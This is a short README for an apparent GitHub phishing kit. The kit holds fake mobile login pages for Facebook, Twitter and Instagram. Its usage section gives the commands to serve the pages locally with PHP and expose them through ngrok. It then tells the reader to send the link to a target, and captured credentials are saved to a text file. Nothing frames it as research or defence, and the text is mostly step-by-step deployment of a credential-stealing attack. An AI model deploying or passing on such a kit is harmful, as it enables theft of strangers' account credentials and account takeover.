# Social Media Phishing
Collection of Social Media Phishing pages (Mobile)  

# Included Sites
* Facebook
* Twitter
* Instagram

# Usage
Terminal 1  
```
git clone https://github.com/4xx404/social-media-phishing
mv ~/social-media-phishing /var/www/html/ && cd /var/www/html/social-media-phishing/
chmod 777 facebook/index.php instagram/index.php twitter/index.php && cd ../
php -S localhost:80
```

# Include Ngrok
Terminal 2  
```
ngrok http 80
```  

Example link using ngrok: ```http://af9cea23de3.ngrok.io/social-media-phishing/siteFolder/```  

Send the link to your target. Credentials will be written to /var/www/html/social-media-phishing/siteFolder/site-creds.txt
